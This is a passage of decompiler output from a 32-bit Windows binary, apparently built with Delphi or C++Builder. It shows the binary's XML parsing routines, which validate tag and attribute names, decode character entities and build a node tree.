  int v11; // edx
  char v12; // al
  char v13; // al
  unsigned __int16 v14; // ax
  char v16; // al
  char v17; // al
  int *v19; // eax
  _WORD *v20; // eax
  char v21; // al
  int v22; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v25; // [esp-8h] [ebp-1Ch]
  int *v26; // [esp-4h] [ebp-18h]
  int v27; // [esp+8h] [ebp-Ch]
  unsigned __int8 v28; // [esp+Fh] [ebp-5h]
  void *v29; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v29 = 0;
  v26 = &savedregs;
  v25 = &loc_436716;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v28 = 1;
  if ( *(_BYTE *)(a1 + 92) )
  {
    *(_BYTE *)(a1 + 92) = 0;
    if ( (unsigned __int16)(a2 - 9) >= 2u && (_WORD)a2 != 13 && (_WORD)a2 != 32 )
    {
      (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Expected space not found");
      v28 = 0;
      goto LABEL_180;
    }
  }
  if ( !*(_DWORD *)(a1 + 88) )
  {
    v6 = a2;
    if ( (unsigned __int16)(a2 - 9) < 2u || (_WORD)a2 == 13 || (_WORD)a2 == 32 )
    {
      v8 = *(_DWORD *)(a1 + 72);
      if ( !v8
        || ((sub_407AD8(*(_DWORD *)(a1 + 84), 1, v8, (_DWORD *)(a1 + 88)),
             v9 = *(_WORD **)(a1 + 88),
             *(_BYTE *)(a1 + 68) != 2)
          ? (v11 = *(_DWORD *)(a1 + 16),
             v27 = *(_DWORD *)(a1 + 88),
             v10 = (*(int (__fastcall **)(int, _WORD *))(*(_DWORD *)v11 + 4))(v11, v9))
          : (v27 = *(_DWORD *)(a1 + 88), v10 = sub_435840(a1, v9, a1)),
            v10) )
      {
        sub_4377A0((_DWORD *)(a1 + 72));
      }
      else
      {
        v28 = 0;
      }
      goto LABEL_180;
    }
    if ( !*(_DWORD *)(a1 + 72) )
    {
      if ( (unsigned __int16)a2 >= 0x370u )
      {
        if ( (unsigned __int16)a2 >= 0x2C00u )
        {
          if ( (unsigned int)(unsigned __int16)a2 - 11264 >= 0x3F0
            && (unsigned int)(unsigned __int16)a2 - 12289 >= 0xA7FF
            && (unsigned int)(unsigned __int16)a2 - 63744 >= 0x4D0
            && (unsigned int)(unsigned __int16)a2 - 65008 >= 0x20E )
          {
            goto LABEL_46;
          }
        }
        else if ( (unsigned int)(unsigned __int16)a2 - 880 >= 0xE
               && (unsigned int)(unsigned __int16)a2 - 895 >= 0x1C81
               && (unsigned int)(unsigned __int16)a2 - 8204 >= 2
               && (unsigned int)(unsigned __int16)a2 - 8304 >= 0x120 )
        {
          goto LABEL_46;
        }
      }
      else if ( (unsigned __int16)a2 >= 0x61u )
      {
        if ( (unsigned int)(unsigned __int16)a2 - 97 >= 0x1A
          && (unsigned int)(unsigned __int16)a2 - 192 >= 0x17
          && (unsigned int)(unsigned __int16)a2 - 216 >= 0x1F
          && (unsigned int)(unsigned __int16)a2 - 248 >= 0x208 )
        {
          goto LABEL_46;
        }
      }
      else if ( (unsigned __int16)a2 != 58
             && (unsigned int)(unsigned __int16)a2 - 65 >= 0x1A
             && (unsigned __int16)a2 != 95 )
      {
LABEL_46:
        v12 = 0;
LABEL_47:
        if ( !v12 )
        {
          (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
            *(_DWORD *)(a1 + 16),
            L"Wrong tag name start char");
          v28 = 0;
          goto LABEL_180;
        }
LABEL_82:
        sub_437740((_DWORD *)(a1 + 72), a2, 0);
        goto LABEL_180;
      }
      v12 = 1;
      goto LABEL_47;
    }
    if ( (unsigned __int16)a2 > 0xB7u )
    {
      if ( (unsigned int)v6 - 768 >= 0x70 && (unsigned int)v6 - 8255 >= 2 )
      {
LABEL_57:
        if ( (unsigned __int16)a2 >= 0x370u )
        {
          if ( (unsigned __int16)a2 >= 0x2C00u )
          {
            if ( (unsigned int)(unsigned __int16)a2 - 11264 >= 0x3F0
              && (unsigned int)(unsigned __int16)a2 - 12289 >= 0xA7FF
              && (unsigned int)(unsigned __int16)a2 - 63744 >= 0x4D0
              && (unsigned int)(unsigned __int16)a2 - 65008 >= 0x20E )
            {
              goto LABEL_79;
            }
          }
          else if ( (unsigned int)(unsigned __int16)a2 - 880 >= 0xE
                 && (unsigned int)(unsigned __int16)a2 - 895 >= 0x1C81
                 && (unsigned int)(unsigned __int16)a2 - 8204 >= 2
                 && (unsigned int)(unsigned __int16)a2 - 8304 >= 0x120 )
          {
            goto LABEL_79;
          }
        }
        else if ( (unsigned __int16)a2 >= 0x61u )
        {
          if ( (unsigned int)(unsigned __int16)a2 - 97 >= 0x1A
            && (unsigned int)(unsigned __int16)a2 - 192 >= 0x17
            && (unsigned int)(unsigned __int16)a2 - 216 >= 0x1F
            && (unsigned int)(unsigned __int16)a2 - 248 >= 0x208 )
          {
            goto LABEL_79;
          }
        }
        else if ( (unsigned __int16)a2 != 58
               && (unsigned int)(unsigned __int16)a2 - 65 >= 0x1A
               && (unsigned __int16)a2 != 95 )
        {
LABEL_79:
          v13 = 0;
LABEL_80:
          if ( !v13 )
          {
            (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
              *(_DWORD *)(a1 + 16),
              L"Wrong tag name char");
            v28 = 0;
            goto LABEL_180;
          }
          goto LABEL_82;
        }
        v13 = 1;
        goto LABEL_80;
      }
    }
    else if ( v6 != 183 && (unsigned int)v6 - 45 >= 2 && (unsigned int)v6 - 48 >= 0xA )
    {
      goto LABEL_57;
    }
    v13 = 1;
    goto LABEL_80;
  }
  if ( *(_BYTE *)(a1 + 68) == 2 && *(_BYTE *)(a1 + 69) != 1 )
    goto LABEL_179;
  if ( *(_DWORD *)(a1 + 96) )
  {
    if ( !*(_BYTE *)(a1 + 100) )
    {
      if ( (unsigned __int16)(a2 - 9) >= 2u && (_WORD)a2 != 13 && (_WORD)a2 != 32 )
      {
        if ( (_WORD)a2 == 39 )
        {
          *(_BYTE *)(a1 + 100) = 1;
        }
        else if ( (_WORD)a2 == 34 )
        {
          *(_BYTE *)(a1 + 100) = 2;
        }
        else
        {
          (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Wrong sequence");
          v28 = 0;
        }
      }
      goto LABEL_180;
    }
    if ( (_WORD)a2 == 39 && *(_BYTE *)(a1 + 100) == 1 || (_WORD)a2 == 34 && *(_BYTE *)(a1 + 100) == 2 )
    {
      *(_BYTE *)(a1 + 100) = 0;
      v19 = sub_406C44(&v29);
      if ( (unsigned __int8)sub_436AD0(a1, *(_DWORD *)(a1 + 84), *(_DWORD *)(a1 + 72), v19) )
      {
        v20 = *(_WORD **)(a1 + 96);
        if ( *(_BYTE *)(a1 + 68) == 2 )
        {
          v27 = *(_DWORD *)(a1 + 96);
          v21 = sub_435580(a1, v20, v29, a1, a3, a2);
        }
        else
        {
          v22 = *(_DWORD *)(a1 + 16);
          v27 = *(_DWORD *)(a1 + 96);
          v21 = (*(int (__fastcall **)(int, _WORD *, void *, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v22 + 16))(
                  v22,
                  v20,
                  v29,
                  v26,
                  v25,
                  ExceptionList);
        }
        if ( v21 )
        {
          sub_406C44((_DWORD *)(a1 + 96));
          sub_4377A0((_DWORD *)(a1 + 72));
          *(_BYTE *)(a1 + 92) = 1;
        }
        else
        {
          v28 = 0;
        }
      }
      goto LABEL_180;
    }
LABEL_179:
    sub_437740((_DWORD *)(a1 + 72), a2, 0);
    goto LABEL_180;
  }
  v14 = a2;
  if ( (unsigned __int16)(a2 - 9) >= 2u && (_WORD)a2 != 13 && (_WORD)a2 != 32 )
  {
    if ( (_WORD)a2 == 61 )
    {
      if ( *(_DWORD *)(a1 + 72) )
      {
        sub_407AD8(*(_DWORD *)(a1 + 84), 1, *(_DWORD *)(a1 + 72), (_DWORD *)(a1 + 96));
        sub_4377A0((_DWORD *)(a1 + 72));
      }
      else
      {
        (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Empty attr name");
        v28 = 0;
      }
      goto LABEL_180;
    }
    if ( !*(_DWORD *)(a1 + 72) )
    {
      if ( (unsigned __int16)a2 >= 0x370u )
      {
        if ( (unsigned __int16)a2 >= 0x2C00u )
        {
          if ( (unsigned int)(unsigned __int16)a2 - 11264 >= 0x3F0
            && (unsigned int)(unsigned __int16)a2 - 12289 >= 0xA7FF
            && (unsigned int)(unsigned __int16)a2 - 63744 >= 0x4D0
            && (unsigned int)(unsigned __int16)a2 - 65008 >= 0x20E )
          {
            goto LABEL_119;
          }
        }
        else if ( (unsigned int)(unsigned __int16)a2 - 880 >= 0xE
               && (unsigned int)(unsigned __int16)a2 - 895 >= 0x1C81
               && (unsigned int)(unsigned __int16)a2 - 8204 >= 2
               && (unsigned int)(unsigned __int16)a2 - 8304 >= 0x120 )
        {
          goto LABEL_119;
        }
      }
      else if ( (unsigned __int16)a2 >= 0x61u )
      {
        if ( (unsigned int)(unsigned __int16)a2 - 97 >= 0x1A
          && (unsigned int)(unsigned __int16)a2 - 192 >= 0x17
          && (unsigned int)(unsigned __int16)a2 - 216 >= 0x1F
          && (unsigned int)(unsigned __int16)a2 - 248 >= 0x208 )
        {
          goto LABEL_119;
        }
      }
      else if ( (unsigned __int16)a2 != 58
             && (unsigned int)(unsigned __int16)a2 - 65 >= 0x1A
             && (unsigned __int16)a2 != 95 )
      {
LABEL_119:
        v16 = 0;
LABEL_120:
        if ( !v16 )
        {
          (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
            *(_DWORD *)(a1 + 16),
            L"Wrong attr name start char");
          v28 = 0;
          goto LABEL_180;
        }
        goto LABEL_82;
      }
      v16 = 1;
      goto LABEL_120;
    }
    if ( (unsigned __int16)a2 > 0xB7u )
    {
      if ( (unsigned int)v14 - 768 >= 0x70 && (unsigned int)v14 - 8255 >= 2 )
      {
LABEL_130:
        if ( (unsigned __int16)a2 >= 0x370u )
        {
          if ( (unsigned __int16)a2 >= 0x2C00u )
          {
            if ( (unsigned int)(unsigned __int16)a2 - 11264 >= 0x3F0
              && (unsigned int)(unsigned __int16)a2 - 12289 >= 0xA7FF
              && (unsigned int)(unsigned __int16)a2 - 63744 >= 0x4D0
              && (unsigned int)(unsigned __int16)a2 - 65008 >= 0x20E )
            {
              goto LABEL_152;
            }
          }
          else if ( (unsigned int)(unsigned __int16)a2 - 880 >= 0xE
                 && (unsigned int)(unsigned __int16)a2 - 895 >= 0x1C81
                 && (unsigned int)(unsigned __int16)a2 - 8204 >= 2
                 && (unsigned int)(unsigned __int16)a2 - 8304 >= 0x120 )
          {
            goto LABEL_152;
          }
        }
        else if ( (unsigned __int16)a2 >= 0x61u )
        {
          if ( (unsigned int)(unsigned __int16)a2 - 97 >= 0x1A
            && (unsigned int)(unsigned __int16)a2 - 192 >= 0x17
            && (unsigned int)(unsigned __int16)a2 - 216 >= 0x1F
            && (unsigned int)(unsigned __int16)a2 - 248 >= 0x208 )
          {
            goto LABEL_152;
          }
        }
        else if ( (unsigned __int16)a2 != 58
               && (unsigned int)(unsigned __int16)a2 - 65 >= 0x1A
               && (unsigned __int16)a2 != 95 )
        {
LABEL_152:
          v17 = 0;
LABEL_153:
          if ( !v17 )
          {
            (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
              *(_DWORD *)(a1 + 16),
              L"Wrong attr name char");
            v28 = 0;
            goto LABEL_180;
          }
          goto LABEL_82;
        }
        v17 = 1;
        goto LABEL_153;
      }
    }
    else if ( v14 != 183 && (unsigned int)v14 - 45 >= 2 && (unsigned int)v14 - 48 >= 0xA )
    {
      goto LABEL_130;
    }
    v17 = 1;
    goto LABEL_153;
  }
LABEL_180:
  __writefsdword(0, (unsigned int)ExceptionList);
  v26 = (int *)&loc_43671D;
  sub_406C44(&v29);
  return v28;
}
// 436734: using guessed type wchar_t aExpectedSpaceN[25];
// 436774: using guessed type wchar_t aWrongTagNameSt[26];
// 4367B4: using guessed type wchar_t aWrongTagNameCh[20];
// 4367E8: using guessed type wchar_t aEmptyAttrName[16];
// 436814: using guessed type wchar_t aWrongAttrNameS[27];
// 436858: using guessed type wchar_t aWrongAttrNameC[21];
// 436890: using guessed type wchar_t aWrongSequence[15];

//----- (004368B0) --------------------------------------------------------
int __fastcall sub_4368B0(int a1, int a2, int a3)
{
  int v5; // ebx

  v5 = 0;
  if ( *(_QWORD *)(a1 + 32) >= sub_427470((_DWORD *)*(_DWORD *)(a1 + 28)) + a3
    && a3 == (*(int (__fastcall **)(_DWORD, int, int))(**(_DWORD **)(a1 + 28) + 12))(*(_DWORD *)(a1 + 28), a2, a3) )
  {
    LOBYTE(v5) = 1;
  }
  return v5;
}

//----- (00436910) --------------------------------------------------------
bool __fastcall sub_436910(int a1, char *a2, int a3)
{
  int v4; // esi
  int i; // [esp+8h] [ebp-Ch]

  for ( i = a3; i > 0; i -= v4 )
  {
    if ( *(_DWORD *)(a1 + 52) >= *(_DWORD *)(a1 + 56) )
    {
      *(_DWORD *)(a1 + 52) = 0;
      *(_DWORD *)(a1 + 56) = (*(int (__fastcall **)(_DWORD, _DWORD, _DWORD))(**(_DWORD **)(a1 + 28) + 12))(
                               *(_DWORD *)(a1 + 28),
                               *(_DWORD *)(a1 + 48),
                               *(_DWORD *)(a1 + 60));
      if ( !*(_DWORD *)(a1 + 56) )
        break;
    }
    v4 = *(_DWORD *)(a1 + 56) - *(_DWORD *)(a1 + 52);
    if ( v4 > i )
      v4 = i;
    System::Move((const void *)(*(_DWORD *)(a1 + 48) + *(_DWORD *)(a1 + 52)), a2, v4);
    a2 += v4;
    *(_DWORD *)(a1 + 52) += v4;
  }
  return i == 0;
}

//----- (00436990) --------------------------------------------------------
_DWORD *__fastcall sub_436990(int a1)
{
  _DWORD *result; // eax

  sub_4377A0((_DWORD *)(a1 + 72));
  sub_406C44((_DWORD *)(a1 + 88));
  result = sub_406C44((_DWORD *)(a1 + 96));
  *(_BYTE *)(a1 + 100) = 0;
  *(_BYTE *)(a1 + 92) = 0;
  return result;
}

//----- (004369C0) --------------------------------------------------------
int __fastcall sub_4369C0(int result, char a2)
{
  if ( a2 != *(_BYTE *)(result + 4) )
  {
    *(_BYTE *)(result + 4) = a2;
    switch ( a2 & 0x7F )
    {
      case 0:
      case 3:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4353F0;
        break;
      case 1:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4353B0;
        break;
      case 2:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4353E0;
        break;
      case 4:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4351B0;
        break;
      case 5:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_435250;
        break;
      case 6:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4352A0;
        break;
      case 7:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_435200;
        break;
      case 8:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_435330;
        break;
      case 9:
        *(_DWORD *)(result + 12) = result;
        *(_DWORD *)(result + 8) = sub_4352F0;
        break;
      default:
        return result;
    }
  }
  return result;
}

//----- (00436A80) --------------------------------------------------------
char __usercall sub_436A80@<al>(int a1@<eax>, int a2)
{
  if ( *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a2 - 20) + 16) + 4) )
  {
    *(_DWORD *)(a2 - 4) = *(_DWORD *)(a2 - 24);
    **(_WORD **)(a2 - 4) = 38;
    *(_DWORD *)(a2 - 4) += 2;
    *(_DWORD *)(a2 - 28) = *(_DWORD *)(a2 - 32);
    *(_DWORD *)(a2 - 28) += 2;
    return 0;
  }
  else
  {
    (***(void (__fastcall ****)(_DWORD, int))(*(_DWORD *)(a2 - 20) + 16))(*(_DWORD *)(*(_DWORD *)(a2 - 20) + 16), a1);
    return 1;
  }
}

//----- (00436AD0) --------------------------------------------------------
int __fastcall sub_436AD0(int a1, int a2, int a3, int *a4)
{
  int v5; // ecx
  int v6; // ecx
  _WORD *v7; // esi
  char v8; // al
  char v9; // al
  int v10; // ebx
  unsigned __int16 v11; // di
  void *v12; // eax
  __int16 v13; // di
  char v14; // al
  int v16; // [esp-10h] [ebp-58h]
  int v17; // [esp-10h] [ebp-58h]
  int v18; // [esp-10h] [ebp-58h]
  unsigned int v19[2]; // [esp-Ch] [ebp-54h] BYREF
  int *v20; // [esp-4h] [ebp-4Ch]
  int v21; // [esp+Ch] [ebp-3Ch] BYREF
  __int16 v22; // [esp+10h] [ebp-38h]
  __int16 v23; // [esp+12h] [ebp-36h]
  int v24; // [esp+14h] [ebp-34h]
  int v25; // [esp+18h] [ebp-30h]
  unsigned __int8 v26; // [esp+1Fh] [ebp-29h]
  int v27; // [esp+20h] [ebp-28h]
  void *v28; // [esp+24h] [ebp-24h] BYREF
  _WORD *v29; // [esp+28h] [ebp-20h]
  _WORD *v30; // [esp+2Ch] [ebp-1Ch]
  char *v31; // [esp+30h] [ebp-18h]
  int v32; // [esp+34h] [ebp-14h]
  _BYTE *v33; // [esp+38h] [ebp-10h]
  void *v34; // [esp+3Ch] [ebp-Ch]
  char *v35; // [esp+40h] [ebp-8h]
  char *v36; // [esp+44h] [ebp-4h]
  int savedregs; // [esp+48h] [ebp+0h] BYREF

  v21 = 0;
  v28 = 0;
  v27 = a3;
  v32 = a1;
  if ( a4 )
    *a4 = 0;
  v20 = &savedregs;
  v19[1] = (unsigned int)&loc_436E59;
  v19[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v19);
  v26 = 0;
  sub_406C44(a4);
  if ( v27 <= 0 )
  {
    v26 = 1;
    goto LABEL_57;
  }
  sub_406C44(&v28);
  sub_407890(a4, v27, v5);
  v36 = (char *)sub_407790(*a4);
  v35 = v36;
  v30 = (_WORD *)sub_407790(a2);
  v7 = &v30[v27];
  while ( v7 != v30 )
  {
    if ( *v30 == 38 )
    {
      v29 = v30;
      v31 = v36;
      while ( v7 != ++v30 )
      {
        if ( *v30 == 59 )
          goto LABEL_11;
      }
      v30 = 0;
LABEL_11:
      if ( v30 )
      {
        v34 = v29 + 1;
        v33 = v30;
        if ( v29 + 1 == v30 )
        {
          v9 = sub_436A80((int)L"Empty ent", (int)&savedregs);
          v6 = v17;
          if ( v9 )
            goto LABEL_57;
        }
        else
        {
          if ( *(_WORD *)v34 == 35 )
          {
            v34 = (char *)v34 + 2;
            if ( v34 == v33 )
            {
              (***(void (__fastcall ****)(_DWORD, const wchar_t *))(v32 + 16))(*(_DWORD *)(v32 + 16), L"Empty num ent");
              goto LABEL_57;
            }
            if ( *(_WORD *)v34 == 120 )
            {
              v34 = (char *)v34 + 2;
              if ( v34 == v33 )
              {
                (***(void (__fastcall ****)(_DWORD, const wchar_t *))(v32 + 16))(
                  *(_DWORD *)(v32 + 16),
                  L"Empty hex num ent");
                goto LABEL_57;
              }
              v10 = 0;
              do
              {
                v11 = *(_WORD *)v34;
                if ( (unsigned __int16)(*(_WORD *)v34 - 48) < 0xAu )
                {
                  v25 = v11 - 48;
                }
                else if ( (unsigned __int16)(*(_WORD *)v34 - 65) < 6u )
                {
                  v25 = v11 - 65 + 10;
                }
                else
                {
                  if ( (unsigned __int16)(*(_WORD *)v34 - 97) >= 6u )
                    break;
                  v25 = v11 - 97 + 10;
                }
                if ( v10 > 0xFFFFFFF )
                  break;
                v10 = v25 + 16 * v10;
                v34 = (char *)v34 + 2;
              }
              while ( v34 != v33 );
              if ( v34 != v33 )
              {
                (***(void (__fastcall ****)(_DWORD, const wchar_t *))(v32 + 16))(
                  *(_DWORD *)(v32 + 16),
                  L"Unable to convert hex num ent");
                goto LABEL_57;
              }
            }
            else
            {
              v10 = 0;
              do
              {
                if ( (unsigned __int16)(*(_WORD *)v34 - 48) >= 0xAu )
                  break;
                v25 = *(unsigned __int16 *)v34 - 48;
                if ( v10 > 214748364 )
                  break;
                v10 = v25 + 10 * v10;
                v34 = (char *)v34 + 2;
              }
              while ( v34 != v33 );
              if ( v34 != v33 )
              {
                (***(void (__fastcall ****)(_DWORD, const wchar_t *))(v32 + 16))(
                  *(_DWORD *)(v32 + 16),
                  L"Unable to convert num ent");
                goto LABEL_57;
              }
            }
            if ( (unsigned int)(v10 - 55296) < 0x800 || (unsigned int)(v10 - 1114112) < 0x7FEF0000 )
            {
              (***(void (__fastcall ****)(_DWORD, const wchar_t *))(v32 + 16))(
                *(_DWORD *)(v32 + 16),
                L"Invalid num ent");
              goto LABEL_57;
            }
            if ( v10 >= 0x10000 )
            {
              v23 = ((unsigned int)v10 >> 10) - 10304;
              *(_WORD *)v36 = v23;
              v36 += 2;
              LOWORD(v10) = v10 & 0x3FF ^ 0xDC00;
              v22 = v10;
            }
            *(_WORD *)v36 = v10;
            v36 += 2;
          }
          else
          {
            v24 = v33 - (_BYTE *)v34;
            sub_407890(&v28, (unsigned int)(v33 - (_BYTE *)v34) >> 1, v6);
            v12 = (void *)sub_407790((int)v28);
            System::Move(v34, v12, v24);
            v13 = (*(int (__fastcall **)(_DWORD, void *))(**(_DWORD **)(v32 + 16) + 20))(*(_DWORD *)(v32 + 16), v28);
            if ( !v13 )
            {
              sub_407968(&v21, L"Unknown ent: ", v28);
              v14 = sub_436A80(v21, (int)&savedregs);
              v6 = v18;
              if ( v14 )
                goto LABEL_57;
              continue;
            }
            *(_WORD *)v36 = v13;
            v36 += 2;
          }
          ++v30;
        }
      }
      else
      {
        v8 = sub_436A80((int)L"Symbol ; not found", (int)&savedregs);
        v6 = v16;
        if ( v8 )
          goto LABEL_57;
      }
    }
    else
    {
      *(_WORD *)v36 = *v30;
      v36 += 2;
      ++v30;
    }
  }
  if ( (unsigned int)(v36 - v35) >> 1 != v27 )
    sub_407890(a4, (unsigned int)(v36 - v35) >> 1, v6);
  v26 = 1;
LABEL_57:
  __writefsdword(0, v19[0]);
  v20 = (int *)&loc_436E60;
  sub_406C44(&v21);
  sub_406C44(&v28);
  return v26;
}
// 436B2B: variable 'v5' is possibly undefined
// 436BA3: variable 'v16' is possibly undefined
// 436BD4: variable 'v17' is possibly undefined
// 436DA5: variable 'v6' is possibly undefined
// 436DED: variable 'v18' is possibly undefined
// 436E7C: using guessed type wchar_t aSymbolNotFound[19];
// 436EB0: using guessed type wchar_t aEmptyEnt[10];
// 436ED0: using guessed type wchar_t aEmptyNumEnt[14];
// 436EF8: using guessed type wchar_t aEmptyHexNumEnt[18];
// 436F28: using guessed type wchar_t aUnableToConver[30];
// 436F70: using guessed type wchar_t aUnableToConver_0[26];
// 436FB0: using guessed type wchar_t aInvalidNumEnt[16];
// 436FDC: using guessed type wchar_t aUnknownEnt[14];

//----- (00437000) --------------------------------------------------------
_DWORD *__fastcall sub_437000(int a1)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  nullsub_3(a1);
  v2 = *(_DWORD **)(a1 + 28);
  *(_DWORD *)(a1 + 28) = 0;
  sub_405598(v2);
  v3 = *(_DWORD **)(a1 + 48);
  *(_DWORD *)(a1 + 48) = 0;
  sub_405598(v3);
  v4 = *(_DWORD **)(a1 + 48);
  *(_DWORD *)(a1 + 48) = 0;
  return sub_405598(v4);
}
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (004370F0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_4370F0@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<edi>)
{
  unsigned int v5; // ebx
  Idthreadcomponent::TIdThreadComponent *v6; // esi
  unsigned int v8[2]; // [esp-18h] [ebp-28h] BYREF
  void **v9; // [esp-10h] [ebp-20h]
  _DWORD v10[5]; // [esp-Ch] [ebp-1Ch] BYREF
  volatile __int32 *v11; // [esp+8h] [ebp-8h]
  __int32 v12; // [esp+Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+10h] [ebp+0h] BYREF

  v12 = 0;
  v11 = a3;
  v10[2] = &savedregs;
  v10[1] = &loc_437191;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v5 = sub_429140(*(_DWORD *)(a1 + 48), a2, 0, a4);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_437174;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v6 = *(Idthreadcomponent::TIdThreadComponent **)(a1 + 48);
  sub_406C44(&v12);
  if ( *((_DWORD *)v6 + 2) <= v5 )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(v6, v5);
  sub_407030(&v12, *(_DWORD *)(*((_DWORD *)v6 + 1) + 8 * v5));
  sub_406FE8(v11, v12);
  __writefsdword(0, v8[0]);
  v9 = (void **)&loc_43717B;
  sub_406C44(&v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_437198;
  return sub_406C44(&v12);
}
// 43718B: bad sp value at call

//----- (004371A0) --------------------------------------------------------
int __fastcall sub_4371A0(int a1, int a2, int a3)
{
  int v3; // edi
  int *v4; // edx
  int v5; // eax
  int v6; // eax
  int v7; // esi
  int v8; // ebx
  int v9; // eax
  char v10; // zf
  int v11; // ebx
  unsigned int v13[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v14; // [esp-4h] [ebp-28h]
  int v15; // [esp+Ch] [ebp-18h]
  __int32 v16[2]; // [esp+10h] [ebp-14h] BYREF
  int v17; // [esp+18h] [ebp-Ch]
  unsigned __int8 v18; // [esp+1Fh] [ebp-5h]
  int v19; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v16[0] = 0;
  v19 = a3;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_437281;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v18 = 1;
  if ( *(_DWORD *)(a1 + 44) )
  {
    v17 = *(_DWORD *)(a1 + 44);
    sub_4370F0(a1, a2, v16, a2);
    v3 = v16[0];
    v16[1] = v17;
    v4 = (int *)(v17 + 12);
    v5 = *(_DWORD *)(v17 + 16);
    if ( v5 )
    {
      v7 = *v4;
      v8 = 4 * v5 + *v4;
      do
      {
        v8 -= 4;
        v9 = *(_DWORD *)(*(_DWORD *)v8 + 8);
        v15 = v3;
        sub_407AA0(v9, v3);
        if ( v10 )
        {
          v6 = *(_DWORD *)v8;
          goto LABEL_10;
        }
      }
      while ( v8 != v7 );
      v6 = 0;
    }
    else
    {
      v6 = 0;
    }
LABEL_10:
    v11 = v6;
    if ( !v6 )
    {
      v15 = v3;
      v11 = sub_429E30((int)&cls_NOM_TNOMAttr, 1, v3, 0, 0);
      sub_429ED0((_DWORD *)(v17 + 12), v11);
    }
    sub_429E10(v11, v19);
  }
  else
  {
    (**(void (__fastcall ***)(int, const wchar_t *))a1)(a1, L"Element not found");
    v18 = 0;
  }
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_437288;
  sub_406C44(v16);
  return v18;
}
// 43722A: variable 'v10' is possibly undefined
// 4299E4: using guessed type __int16 cls_NOM_TNOMAttr;
// 4372A0: using guessed type wchar_t aElementNotFoun[18];

//----- (004372D0) --------------------------------------------------------
int __usercall sub_4372D0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v4; // edx
  int (**v5)(); // esi
  int v6; // eax
  unsigned int v8[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v9; // [esp-10h] [ebp-14h]
  unsigned __int16 *v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_437372;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  LOBYTE(a3) = 1;
  sub_4370F0((int)a1, a2, (volatile __int32 *)&v10, (int)a1);
  if ( a1[7] )
  {
    if ( a1[11] )
    {
      v6 = sub_429CF0(a1[11], (int)v10);
      sub_4376E0(a1, v6);
    }
    else
    {
      (*(void (__fastcall **)(_DWORD *, const wchar_t *))*a1)(a1, L"Only one root allowed");
      a3 = 0;
    }
  }
  else
  {
    v5 = (int (**)())sub_429C00(v10, a1[5], a1[6]);
    if ( !v5 )
      v5 = cls_NOM_TNOMNode;
    LOBYTE(v4) = 1;
    a1[7] = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(v5, v4, v10);
    sub_4376E0(a1, a1[7]);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_437379;
  sub_406C44(&v10);
  return a3;
}
// 43731F: variable 'v4' is possibly undefined
// 429AF4: using guessed type int (*cls_NOM_TNOMNode[3])();
// 429C90: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);
// 437390: using guessed type wchar_t aOnlyOneRootAll[22];

//----- (004373C0) --------------------------------------------------------
int __usercall sub_4373C0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  char v5; // zf
  int v6; // eax
  int v8; // [esp-20h] [ebp-24h]
